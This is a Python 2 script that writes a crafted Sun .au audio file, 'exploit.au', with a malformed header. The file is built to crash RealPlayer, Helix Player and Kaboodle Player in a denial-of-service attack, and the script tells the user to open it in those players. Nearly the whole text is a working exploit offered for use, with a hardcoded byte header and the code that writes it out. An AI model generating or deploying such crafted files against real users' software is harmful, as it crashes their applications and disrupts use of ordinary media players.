import sys
import os

head = ("\x2E\x73\x6E\x64\x00\x00\x01\x18\x02\x01\x42\xDC\x00\x00\x00\x01"+

        "\x02\x02\x1F\x40\x00\x00\x00\x00\x00" +

        "\x31\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+

        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+

        "\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"+

        "\x00\x00\x00\x00\x00\x00\x00\x00\x66\x66\x66\x00")

print "[x] RealPlayer/Helix Player/Kaboodle Player DoS"

try:
   f = open("exploit.au",'w')
except IOError, e:
    print "Unable to open file ", e
    sys.exit(0)

print "[x] File successfully opened for writing."
try:
   f.write(head)
except IOError, e:
    print "Unable to write to file ", e
    sys.exit(0)
print "[x] File successfully written."
f.close()
print "[x] Open exploit.au with RealPlayer/Helix/Kaboodle Players."

